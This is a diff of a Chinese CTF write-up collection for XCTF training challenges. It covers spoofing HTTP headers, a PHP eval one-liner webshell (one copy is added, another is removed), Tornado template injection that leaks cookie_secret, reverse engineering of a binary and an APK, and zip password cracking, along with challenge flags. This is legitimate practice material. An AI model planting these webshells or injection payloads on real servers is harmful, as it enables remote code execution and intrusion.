@@ -1112,7 +1112,7 @@ cyberpeace{3f49e5587bdf9b3537041be32468aa17}
 
 菜鸡感觉这题似乎没有办法溢出，真的么?
 
-**题目场景**  
+**题目场景:**
 
 111.200.241.244:44057
 
@@ -1738,7 +1738,7 @@ X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两
 ```python
 import requests
 url='http://111.200.241.244:56032/?a=1'#get请求
-payload=dict(b='2')#post值
+payload={"b":"2"}#post值
 res=requests.post(url,data=payload)#post请求
 res=res.content.decode('utf-8')
 print(res)
@@ -1748,52 +1748,70 @@ cyberpeace{153e91524b81d5e276ccebf8640c1b45}
 
 #### 9-Web-xff_referer
 
+**题目来源：**
+
+Cyberpeace-n3k0
+
 **题目描述：**
 
 X老师告诉小宁其实xff和referer是可以伪造的。
+
+**题目场景:**  
+
+111.200.241.244:56031
 
 **题目思路：**
 
 本题是考察的HTTP头的伪装修改
 
-**X-Forwarded-For (XFF)** 在客户端访问服务器的过程中如果需要经过HTTP代理或者负载均衡服务器,可以被用来获取最初发起请求的客户端的IP地址,这个消息首部成为事实上的标准。在消息流从客户端流向服务器的过程中被拦截的情况下,服务器端的访问日志只能记录代理服务器或者负载均衡服务器的IP地址。如果想要获得最初发起请求的客户端的IP地址的话,那么 X-Forwarded-For 就派上了用场。
-这个消息首部会被用来进行调试和统计,以及生成基于位置的定制化内容,按照设计的目的,它会暴露一定的隐私和敏感信息,比如客户端的IP地址。所以在应用此消息首部的时候,需要将用户的隐私问题考虑在内。
+X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项
 
-**Referer**请求头包含了当前请求页面的来源页面的地址,即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源,可能会以此进行统计分析、日志记录以及缓存优化等。
+HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的
 
 **解题过程：**
 
-方法一：F12,网络,消息头,重新编辑报文,在最下面加入Referer:https://www.google.com,X-Forwarded-For:123.123.123.123,再发送。
+打开bp抓包，发送到Request，修改数据包，然后发送
 
-从响应载荷下面一长串中可以找到flag。
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20191025100435583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoaWRvbmdoYW5n,size_16,color_FFFFFF,t_70)
-
-方法二：
-
-打开bp抓包,发送到Request,更改
-
-Referer:https://www.google.com
-
-X-Forwarded-For:123.123.123.123
-
-然后发送
+> Referer:https://www.google.com
+>
+> X-Forwarded-For:123.123.123.123
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20191027232134353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2MDEyODg5,size_16,color_FFFFFF,t_70)
 
-cyberpeace{ee36528e83628466c63b97fbac0c64dd}
+或者使用火狐中的ModHeader插件，在request headers中添加对应键值
+
+```python
+import requests
+url='http://111.200.241.244:62216'
+headers={"X-Forwarded-For":"123.123.123.123","Referer":"https://www.google.com"}
+res=requests.get(url,headers=headers)
+res=res.content.decode('utf-8')
+print(res)
+```
+
+cyberpeace{7b1c744755e6f37b2fe586fbd2bb7bc6}
 
 #### 10-Web-webshell
+
+**题目来源：**
+
+Cyberpeace-n3k0
 
 **题目描述：**
 
 小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。
 
+**题目场景:**  
+
+111.200.241.244:59374
+
 **题目思路：**
 
-这道题考查菜刀的使用,用过的话就没什么难度
+考查webshell连接工具的使用
 
-题目描述中提示了一句话木马是index.php,访问网页ip:端口/index.php,看到一句话是<?php @eval($_POST[‘shell’]);?>  ,得到’密码‘是shell,菜刀连接,文件管理就可以看到flag了
+**解题过程：**
+
+题目描述中提示了一句话木马是index.php，访问网页ip:端口/index.php，看到一句话是`<?php @eval($_POST['shell']);?>` ，密码是shell，菜刀或者蚁剑连接，文件管理就可以看到flag了
  ![10](https://img-blog.csdnimg.cn/20190523202821983.JPG)
 
 cyberpeace{19646266ef681ffa45a0d5ff71c4db3c}
@@ -1824,7 +1842,7 @@ cyberpeace{86471d4238d9bc8a7f7f3e63ecbc11da}
 
 **题目描述：**
 
- 小宁发现了一个网页,但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 
+小宁发现了一个网页,但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} ) 
 
 **题目思路：**
 
@@ -2144,6 +2162,72 @@ print(flag)
 ```
 
 nctf{d3c0mpil1n9_PyC}
+
+#### 6-Reverse-getit
+
+**题目来源：**
+
+SharifCTF 2016
+
+**题目描述：**
+
+菜鸡发现这个程序偷偷摸摸在自己的机器上搞事情，它决定一探究竟
+
+**题目附件：**
+
+[e3dd9674429f4ce1a25c08ea799fc027](https://adworld.xctf.org.cn/media/task/attachments/e3dd9674429f4ce1a25c08ea799fc027)
+
+**题目思路：**
+
+动态调试，结合反编译代码找到flag
+
+**解题过程：**
+
+在010Editor 中打开该文件，看到magic number 是ELF，说明是Linux 下的可执行文件。放到ida64中，f5反编译，程序大概是把生成的flag，写入文件，放在/tmp/flag.txt 中，但最后又remove 了这个文件。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp){
+  char v3; // al
+  __int64 v5; // [rsp+0h] [rbp-40h]
+  int i; // [rsp+4h] [rbp-3Ch]
+  FILE *stream; // [rsp+8h] [rbp-38h]
+  char filename[8]; // [rsp+10h] [rbp-30h]
+  unsigned __int64 v9; // [rsp+28h] [rbp-18h]
+  v9 = __readfsqword(0x28u);
+  LODWORD(v5) = 0;
+  while ( (signed int)v5 < strlen(s) ){
+    if ( v5 & 1 )
+      v3 = 1;
+    else
+      v3 = -1;
+    *(&t + (signed int)v5 + 10) = s[(signed int)v5] + v3;
+    LODWORD(v5) = v5 + 1;
+  }
+  strcpy(filename, "/tmp/flag.txt");
+  stream = fopen(filename, "w");
+  fprintf(stream, "%s\n", u, v5);
+  for ( i = 0; i < strlen(&t); ++i ){
+    fseek(stream, p[i], 0);//fseek函数可改变读写文件的位置指针
+    fputc(*(&t + p[i]), stream);//从文件头开始，在p[i]的位置写入了一个字符
+    fseek(stream, 0LL, 0);
+    fprintf(stream, "%s\n", u);//从文件头开始，直接写入了一个字符串u， 双击u可以看到*
+  }
+  fclose(stream);
+  remove(filename);
+  return 0;
+}
+```
+
+在remove之前F2下断点，在虚拟机中运行linux_server64，F9运行起来，输入对应ip，到/tmp目录下查看flag.txt文件，发现该文件加密了。
+
+```bash
+giantbranch@ubuntu:/tmp$ cat flag.txt 
+*********{*********************************
+```
+
+在for函数中，两次使用了fseek 函数。也就是说一共写入了两次，第一次写入flag，第二次写入\*覆盖了原来的flag，想要获取真正的flag，关键在于26，27 行，循环了strlen(t)次，每次都是取一个字符输入到文件中。双击t，可以看到t 变量在data 段的地址为6010E0，ida安装python模块后，输入get_bytes(0x6010E1,50)得到flag，但是少个S
+
+harifCTF{b70c59275fcfa8aebf2d5911223c6589}
 
 #### 7-Reverse-game
 
@@ -2601,7 +2685,7 @@ poxlove3
 
 **题目描述：**
 
-解答出来了上一个题目的你现在可是春风得意,你们走向了下一个题目所处的地方 你一看这个题目傻眼了,这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼,小鱼哈哈一笑  ,让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二,小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}
+解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑  ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}
 
 **题目附件：**
 
@@ -2609,18 +2693,24 @@ poxlove3
 
 **题目思路：**
 
-附件下载时文本文档内容是：在一次RSA密钥对生成中,假设p=473398607161,q=4511491,e=17
-求解出d
+附件下载时文本文档内容是
 
-好像就是考RSA的公式,那先脑补一下算法
+> 在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17
+> 求解出d
 
-任选两个大质数p和q,p!=q,计算N=pq
-计算N的欧拉函数r(n)=(p-1)(q-1)
-任选一个e满足 1<e<r(n) ,且e与r(n)互质
-找到d,使e*d/r(n)=x……1（x是多少不重要,重要的是余数为1）
-至此（n,e）为公钥,（n,d）为私钥
-加密：C=M^（e mod n)；解密：M=C^（d mod n）
-e d mod Φ（n）=== 1  -->  d=(k(q-1)(p-1)+1)/e
+先脑补一下RSA算法
+
+- 任选两个大质数p和q，p!=q，计算N=pq
+
+- 计算N的欧拉函数r(n)=(p-1)(q-1)
+
+- 任选一个e满足 1<e<r(n) ，且e与r(n)互质
+
+- 找到d，使e*d/r(n)=x……1（x是多少不重要，重要的是余数为1）
+
+  至此（n,e）为公钥，（n,d）为私钥
+  加密：C=M^（e mod n)；解密：M=C^（d mod n）
+  e *d mod Φ(n)=== 1  ->  d=(k(q-1)(p-1)+1)/e
 
 **解题过程：**
 
@@ -2660,31 +2750,23 @@ NJUPT_CTF
 
 **题目思路：**
 
-本题是一个异或加密
+反编译可以使用uncompyle6或者[在线反编译pyc](https://tool.lu/pyc/)
 
-反编译可以使用uncompyle6或者在线反编译pyc
-
-安装uncompyle6，pip install uncompyle6
-
-反编译命令 uncompyle6 crypto11.pyc，得到：UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===
-
-我们通过反顺序异或来反编译出flag
+安装uncompyle6，反编译pyc，将最后的值通过逆运算得出flag
 
 **解题过程：**
 
-附件下载下来发现是一个.pyc文件
+附件下载下来发现是一个.pyc文件。pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte code，py文件变成pyc文件后，运行加载的速度会有所提高；另一方面，把py文件编译为pyc文件，从而可以实现部分的源码隐藏，保证了python做商业化软件时的安全性
 
-pyc是一种二进制文件，是由py文件经过编译后，生成的文件，是一种byte code，py文件变成pyc文件后，运行加载的速度会有所提高；另一反面，把py文件编译为pyc文件，从而可以实现部分的源码隐藏，保证了python做商业化软件时的安全性
+[uncompyle6](https://github.com/rocky/python-uncompyle6)是一个原生python的跨版本反编译器和fragment反编译器，是decompyle、uncompyle、uncompyle2等的接替者。uncompyle6可将python字节码转换回等效的python源代码，它接受python 1.3版到3.8版的字节码，这其中跨越了24年的python版本，此外还包括Dropbox的Python 2.5字节码和一些PyPy字节码。
 
-uncompyle6是一个原生python的跨版本反编译器和fragment反编译器，是decompyle、uncompyle、uncompyle2等的接替者。uncompyle6可将python字节码转换回等效的python源代码，它接受python 1.3版到3.8版的字节码，这其中跨越了24年的python版本，此外还包括Dropbox的Python 2.5字节码和一些PyPy字节码。github项目：https://github.com/rocky/python-uncompyle6
-
-```python
+```bash
 pip3 install uncompyle6
 #在.pyc所在文件夹位置打开cmd，输入命令
 uncompyle6 -o . XXX.pyc
 ```
 
-成功反编译为出.py文件,将print’correct’改为print(‘correct’)，将flag=raw_input()改为flag = eval(input())
+成功反编译为出.py文件，将print 'correct'改为print('correct')，将flag=raw_input()改为flag = eval(input())就可以运行了
 
 ```python
 # uncompyle6 version 3.6.4
@@ -2693,21 +2775,21 @@ uncompyle6 -o . XXX.pyc
 # Embedded file name: ans.py
 # Compiled at: 2018-08-09 11:29:44
 import base64
-def encode1(ans):
+def encode1(ans):#异或和加和运算
     s = ''
     for i in ans:
         x = ord(i) ^ 36
         x = x + 25
         s += chr(x)
     return s
-def encode2(ans):
+def encode2(ans):#异或和加和运算
     s = ''
     for i in ans:
         x = ord(i) + 36
         x = x ^ 36
         s += chr(x)
     return s
-def encode3(ans):
+def encode3(ans):#调用base64库里的b32encode()函数进行base32运算。
     return base64.b32encode(ans)
 flag = ' '
 print('Please Input your flag:')
@@ -2719,9 +2801,7 @@ else:
     print('wrong')
 ```
 
-encode1和encode2是做异或和加和运算，encode3是调用base64库里的b32encode()函数进行base32运算。
-
-接下来，就修改了原始代码，首先是进入函数的顺序改成先进函数3再进2最后进1。然后就是每个函数内部运算，+变-，-变+，异或运算的逆过程就是再做一次异或，所以不用变。
+首先是进入函数的顺序改成先进函数3再进2最后进1。然后就是每个函数内部运算，+变-，-变+，异或运算的逆过程就是再做一次异或
 
 ```python
 import base64
@@ -3127,6 +3207,113 @@ public class Base64New {
 
 flag{05397c42f9b6da593a3644162d36eb01}
 
+#### 4-Mobile-app1
+
+**题目附件：**
+
+[b9af8dfef6b749d2819ef5be16c26a0d.apk](https://adworld.xctf.org.cn/media/task/attachments/b9af8dfef6b749d2819ef5be16c26a0d.apk)
+
+**题目思路：**
+
+通过jeb将apk反编译，找到关键判断进行算法逆向
+
+**解题过程：**
+
+首先我们使用老套路，用jeb或者dex2jar反编译后用jd-gui打开，并且查看java源码，在apk下bytecode中的MainActivity找到主类，右键decompile
+
+```java
+package com.example.yaphetshan.tencentgreat;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager$NameNotFoundException;
+import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
+import android.view.View$OnClickListener;
+import android.view.View;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+public class MainActivity extends AppCompatActivity {
+    Button btn;
+    public final String pName;
+    EditText text;
+    public MainActivity() {
+        super();
+        this.pName = "com.example.yaphetshan.tencentgreat";
+    }
+    protected void onCreate(Bundle arg3) {
+        super.onCreate(arg3);
+        this.setContentView(2130968603);
+        this.btn = this.findViewById(2131427416);
+        this.text = this.findViewById(2131427415);
+        this.btn.setOnClickListener(new View$OnClickListener() {
+            public void onClick(View arg10) {
+                try {
+                    String v1 = MainActivity.this.text.getText().toString();
+                    PackageInfo v2 = MainActivity.this.getPackageManager().getPackageInfo("com.example.yaphetshan.tencentgreat", 16384);
+                    String v3 = v2.versionName;
+                    int v4 = v2.versionCode;
+                    int v0 = 0;
+                    while(v0 < v1.length()) {
+                        if(v0 >= v3.length()) {
+                            break;
+                        }
+                        if(v1.charAt(v0) != (v3.charAt(v0) ^ v4)) {//要完成这个条件才行，v4和v3的每一位异或，最后与v1比较
+                            Toast.makeText(MainActivity.this, "再接再厉，加油~", 1).show();
+                            return;
+                        }
+                        else {
+                            ++v0;
+                            continue;
+                        }
+                    }
+                    if(v1.length() != v3.length()) {
+                        goto label_39;
+                    }
+                    Toast.makeText(MainActivity.this, "恭喜开启闯关之门！", 1).show();
+                    return;
+                }
+                catch(PackageManager$NameNotFoundException v5) {
+                }
+            label_39:
+                Toast.makeText(MainActivity.this, "年轻人不要耍小聪明噢", 1).show();
+            }
+        });
+    }
+}
+```
+
+就是一个异或运算，在apk下bytecode中找到BuildConfig类，右键decompile，发现v3=VERSION_NAME，v4=VERSION_CODE
+
+```java
+package com.example.yaphetshan.tencentgreat;
+public final class BuildConfig {
+    public static final String APPLICATION_ID = "com.example.yaphetshan.tencentgreat";
+    public static final String BUILD_TYPE = "debug";
+    public static final boolean DEBUG = false;
+    public static final String FLAVOR = "";
+    public static final int VERSION_CODE = 15;
+    public static final String VERSION_NAME = "X<cP[?PHNB<P?aj";
+    static {
+        BuildConfig.DEBUG = Boolean.parseBoolean("true");
+    }
+    public BuildConfig() {
+        super();
+    }
+}
+```
+
+那就是15和`X<cP[?PHNB<P?aj`进行异或。 将每个字符转成的ASCII 数值与15的16进制进行异或，将ASCII 数值转换成字符串得到flag
+
+```python
+str = "X<cP[?PHNB<P?aj"
+flag=''
+for i in str:
+    flag+=chr(ord(i)^15)
+print(flag)
+```
+
+W3l_T0_GAM3_0ne
+
 ## 高手区
 
 ### MISC
@@ -3135,7 +3322,7 @@ flag{05397c42f9b6da593a3644162d36eb01}
 
 **题目思路：**
 
-base64÷4=base16,用在线base16解码即可得到flag
+base64÷4=base16，用在线base16解码即可得到flag
 
 **解题过程**：
 
@@ -3153,13 +3340,13 @@ flag{E33B7FD8A3B841CA9699EDDBA24B60AA}
 
 **题目思路：**
 
-解压后是一个pcap数据包,看到登录应该找HTTP POST请求了,用wireshark打开搜索即可得到答案
+解压后是一个pcap数据包，看到登录应该找HTTP POST请求了，用wireshark打开搜索即可得到答案
 
 **解题过程**：
 
 可以使用winhex打开搜索password
 
-也可以wireshark打开,搜索http,第20个包是post的包,可能包含管理员密码,打开后从html中找到password
+也可以wireshark打开，搜索http，第20个包是post的包，可能包含管理员密码，打开后从html中找到password
 
 ![img](https://adworld.xctf.org.cn/media/task/writeup/cn/wireshark-1/1.png)
 
@@ -3177,7 +3364,7 @@ ffb7567a1d4f4abdffdb54e022f8facd
 
 **解题过程**：
 
-用winhex打开,就能直接看到flag
+用winhex打开，就能直接看到flag
 
 ![img](https://adworld.xctf.org.cn/media/task/writeup/cn/Training-Stegano-1/1.png)
 
@@ -3187,15 +3374,15 @@ steganoI
 
 **题目思路：**
 
-使用winhex打开发现是zip文件,然后用ziperello爆破
+使用winhex打开发现是zip文件，然后用ziperello爆破
 
 **解题过程**：
 
-第一步,下载文件发现,一个未知格式的文件,使用winhex/01编辑器打开发现是zip文件,于是修改后缀名为zip。发现里面有一个加密的flag.txt文件。
+第一步,下载文件发现，一个未知格式的文件，使用winhex/01编辑器打开发现是zip文件，于是修改后缀名为zip。发现里面有一个加密的flag.txt文件。
 
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/2020020610303222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Zvb2xfYmVzdA==,size_16,color_FFFFFF,t_70)
 
-第二步、利用ziperello（D:\CTF\Crypto\编码与密码\密码\Zip\Ziperello\Ziperello.exe）进行爆破,选择所有字符,很快可以爆破出来密码是fish,即可得到flag
+第二步、利用ziperello（D:\CTF\Crypto\编码与密码\密码\Zip\Ziperello\Ziperello.exe）进行爆破，选择所有字符，很快可以爆破出来密码是fish，即可得到flag
 
 flag{ev3n::y0u::bru7us?!}
 
@@ -3209,7 +3396,7 @@ flag{ev3n::y0u::bru7us?!}
 
 打开解压，发现条形码的图片
 
-直接在线扫描条形码（https://online-barcode-reader.inliteresearch.com/）,把图片上传上去Read然后就能得到flag
+直接在线扫描条形码（https://online-barcode-reader.inliteresearch.com/），把图片上传上去Read然后就能得到flag
 
 ![img](https://adworld.xctf.org.cn/media/uploads/writeup/11024c0a4ee811ea88a3fa163e3c3fd2.png)
 
@@ -3219,11 +3406,11 @@ flag{TENSHINE}
 
 **题目思路：**
 
-下载后发现文件有点小,所以就不考虑是有隐藏文件了
+下载后发现文件有点小，所以就不考虑是有隐藏文件了
 
 **解题过程**：
 
-直接放进winhex,或者是sublime里,里面内容是：
+直接放进winhex，或者是sublime里，里面内容是：
 
 ```
 666c61677b68656c6c6f5f776f726c647d
@@ -3265,13 +3452,13 @@ e5353bb7b57578bd4da1c898a8e2d767
 
 **题目思路：**
 
-解压出没有后缀的文件,添加后缀.zip,继续解压还是压缩包,最后解压出两张图片,其中每个位置的黑色像素和白色像素是互补的
+解压出没有后缀的文件，添加后缀.zip，继续解压还是压缩包，最后解压出两张图片，其中每个位置的黑色像素和白色像素是互补的
 
 **解题过程**：
 
 tar -xvf e66ea8344f034964ba0b3cb9879996ff.gz
 
-得到pic1.jpg,pic2.jpg,打开stegsolve(D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar),先打开其中一张图片，然后点analyse->image combiner,添加另一张图片,就可以看到flag
+得到pic1.jpg,pic2.jpg，打开stegsolve(D:\CTF\hack\个人CTFTools\隐写\图像隐写\Stegsolve.jar)，先打开其中一张图片，然后点analyse->image combiner，添加另一张图片，就可以看到flag
 
 ![img](https://adworld.xctf.org.cn/media/uploads/writeup/bc67bb56e67f11e99f5500163e004e93.png)
 
@@ -3604,7 +3791,7 @@ Processing: mail2LiHua.jpg
 *|
 ```
 
-打开需要密码。 这个题目就略坑了，满满的都是脑洞，没有特殊字符，是指密码中没有特殊字符。而不少于`1000`个字，这个1000是8的二进制，所以密码是9位或9位以上，最后署名，意思是密码中后面5位数是Lihua，最后用软件(D:\CTF\hack\压缩包破解\Ziperello\Ziperello\Ziperello.exe)进行破解。 打开后添加要解密的压缩包，基于模板的破解，密码模板：xxxxLLHHa。
+打开需要密码。 这个题目就略坑了，满满的都是脑洞，没有特殊字符，是指密码中没有特殊字符。而不少于`1000`个字，这个1000是8的二进制，所以密码是9位或9位以上，最后署名，意思是密码中后面5位数是LiHua，最后用软件(D:\CTF\hack\压缩包破解\Ziperello\Ziperello\Ziperello.exe)进行破解。 打开后添加要解密的压缩包，基于模板的破解，密码模板：xxxxLLHHa。
 
 | L    | Li                                                           |
 | :--- | ------------------------------------------------------------ |
@@ -4739,29 +4926,65 @@ for(var o=0;o<13;++o){
 
 flag{it's_a_h0le_in_0ne}
 
-#### 10-Web-upload1
+#### 9-Web-easytornado
+
+**题目来源：**
+
+护网杯 2018
+
+**题目描述：**
+
+Tornado 框架
+
+**题目场景:**
+
+111.198.29.45:39004
 
 **题目思路：**
 
-直接删掉js前端的过滤,上传一句话菜刀连接
+Tornado 框架SSTI服务器端模板注入
 
 **解题过程**：
 
-f12,把οnchange="check();"删了![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923223343614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwODg0NzI3,size_16,color_FFFFFF,t_70)
+有三个txt目录，我们分别点击。
 
-上传一句话,D:\CTF\web\1.Php,密码是cmd
+> /welcome.txt
+>
+> 111.198.29.45:39004/file?filename=/welcome.txt&filehash=9aeecdd1844b70a3c4c719d2303cfaeb
 
-```php
-<?php @eval($_POST['cmd']);?>
-```
+ ![img](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171239530-304397140.png)
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923223427988.png)
+render是一个Tomado框架的一个渲染函数，即可以通过传递不同的参数形成不同的页面
 
-把上传路径复制一下,前面加上ip+端口,打开菜刀,D:\CTF\web\caidao,每次容器的密码不同
+> /hints.txt
+>
+> 111.198.29.45:39004/file?filename=/hints.txt&filehash=9226131c021e8a84f91c65972c94ca3b
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20190923223453791.png)
+ ![img](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171236232-491097478.png)
 
-cyberpeace{d8d5d509616f061ecee7f924054ba441}
+> /flag.txt
+>
+> 111.198.29.45:39004/file?filename=/flag.txt&filehash=ed15d1deebc3e76eaf460728563f05d7
+
+ ![img](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171231073-1709366133.png)
+
+ flag在/fllllllllllllag文件中，url中的filehash是md5(cookie_secret+md5(filename))，filename已知道，只差cookie_secret，直接输入file?filename=/fllllllllllllag尝试，url跳转页面为error，传递error?msg={{2}}，页面出现2，存在[SSTI模板注入](https://blog.csdn.net/zz_Caleb/article/details/96480967)
+
+![img](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171207286-270462963.png)
+
+传递error?msg={{2*3}}，页面出现ORZ(尝试_和+也是），说明是符号被过滤了。
+
+ ![img](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171204839-559868891.png)
+
+通过模板注入如何拿到tornado中的cookie，用的就是handler.settings对象，handler 指向RequestHandler，[RequestHandler.settings](https://www.tornadoweb.org/en/stable/web.html?highlight=RequestHandler.settings#tornado.web.RequestHandler.settings)的别名是self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，传递error?msg={{handler.settings}}得到：
+
+ ![img](https://img2020.cnblogs.com/i-beta/1929500/202003/1929500-20200317171155689-116575536.png)
+
+使用[md5加密](https://www.cmd5.com/)构造计算出filehash=md5(cookie_secret+md5(/fllllllllllllag))，传递参数得到flag
+
+![img](https://img-blog.csdnimg.cn/20200714213936815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hqMjg1NTU=,size_16,color_FFFFFF,t_70)
+
+flag{3f39aea39db345769397ae895edb9c70}
 
 #### 17-Web-mfw
 
@@ -4867,7 +5090,7 @@ cyberpeace{fe617ee23d8f45e681d79625931a5efc}
  哦们可以猜测他的php代码（前面还有提示哦）
 
 ```
-​```perl use strict; use warnings; use CGI;
+```perl use strict; use warnings; use CGI;
 my $cgi= CGI->new; 
 if ( $cgi->upload( 'file' ) ) 
 { my $file= $cgi->param( 'file' ); 
